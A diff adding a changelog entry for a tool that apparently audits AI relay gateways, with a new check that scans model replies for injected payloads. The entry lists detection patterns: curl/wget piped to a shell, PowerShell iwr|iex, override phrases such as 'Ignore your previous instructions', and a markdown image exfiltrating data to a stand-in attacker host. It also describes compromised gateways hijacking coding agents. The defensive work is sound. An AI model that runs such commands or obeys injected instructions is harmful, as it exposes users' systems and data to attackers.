@@ -5,6 +5,49 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.3.0-rc.1] — 2026-05-26
+
+Adds **`injection_safety`** — a new core dimension that detects relay
+response poisoning. Motivated by the wave of "AI relay supply-chain"
+incidents in 2026 Q2 where compromised gateways spliced executable
+payloads into otherwise-normal model replies, with the goal of
+hijacking downstream agents (Claude Code, Codex, Aider, Cline, etc.)
+that obediently execute "fix it by running this" suggestions.
+
+### Added
+
+- `injection_safety` dimension. Probes the upstream with deliberately
+  innocuous prompts ("What is 12 × 7?", "Name a Renaissance painter")
+  so any of the following in the response is by construction
+  relay-injected, not model-emitted:
+  - `curl … | bash`, `wget … | sh`, `bash <(curl …)`, PowerShell
+    `iwr | iex` or `-EncodedCommand` patterns — score collapses to 0.
+  - "Ignore your previous instructions", "new system prompt:", "to
+    continue, run …" rogue-instruction phrases — score 0.
+  - Markdown image references that exfiltrate via URL parameters
+    (`![](https://attacker/log?q=…)`) — score 20.
+  - Zero-width / RTL-override unicode embedded in prose — score 40.
+  - Long base64 / hex blobs inside a one-word answer — score 70.
+- `data/probes.yaml` gains an `injection_safety` pool of 8 benign
+  prompts. The pool is intentionally trivial so any anomaly in the
+  reply has no plausible model-side origin.
+
+### Changed
+
+- Score weights rebalanced for 6 dimensions (was 5):
+  `online 0.10, identity_consistency 0.20, wrapper_detection 0.15,
+  token_billing 0.15, tool_use 0.20, injection_safety 0.20`. Skipped
+  dimensions still drop out and the remainder is renormalized.
+- Dimension registry order ends with `InjectionSafety` so the UI
+  surfaces it last alongside other capability checks.
+
+### Tests
+
+- 11 new tests cover the severity ladder (clean → blob → unicode →
+  exfil-image → rogue-instructions → curl-pipe-bash) plus pure-unit
+  tests for `_scan` to lock the no-false-positive guarantee on plain
+  `curl` mentions, short numeric answers, etc.
+
 ## [0.2.0-rc.5] — 2026-05-26
 
 Replaces the `identity_consistency` hard-veto with a per-round verdict
